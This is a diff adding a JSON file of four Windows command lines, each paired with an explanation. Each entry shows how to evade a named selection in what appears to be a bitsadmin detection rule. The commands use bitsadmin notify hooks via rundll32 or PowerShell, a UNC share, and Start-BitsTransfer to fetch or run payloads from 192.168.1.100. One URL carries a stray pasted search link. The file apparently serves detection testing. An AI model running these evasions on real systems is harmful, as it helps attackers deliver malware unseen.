@@ -1,0 +1,18 @@
+[
+  {
+    "output": "bitsadmin.exe /SetNotifyCmdLine myjob \"C:\\Windows\\System32\\rundll32.exe\" \"C:\\temp\\payload.dll,EntryPoint\"",
+    "explanation": "Bypasses selection_cli_notify_2 by utilizing rundll32.exe as the notification trigger instead of the hardcoded cmd.exe, %COMSPEC%, or regsvr32.exe strings."
+  },
+  {
+    "output": "bitsadmin.exe /Addfile myjob \\192.168.1.100\\share\\payload.exe C:\\temp\\payload.exe",
+    "explanation": "Bypasses selection_cli_add_2 by utilizing an SMB/UNC path to retrieve the remote file, evading the strict string checks for http:, https:, ftp:, and ftps: protocols."
+  },
+  {
+    "output": "Start-BitsTransfer -Source [http://192.168.1.100/payload.exe](https://www.google.com/search?q=http://192.168.1.100/payload.exe) -Destination C:\\temp\\payload.exe",
+    "explanation": "Bypasses selection_img completely. By using the native PowerShell BITS module, the malicious download occurs without invoking the bitsadmin.exe binary."
+  },
+  {
+    "output": "bitsadmin.exe /SetNotifyCmdLine myjob powershell.exe \"-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\temp\\payload.ps1\"",
+    "explanation": "Bypasses selection_cli_notify_2 by calling powershell.exe. The rule's coverage for notification executables is incomplete and fails to account for PowerShell."
+  }
+]
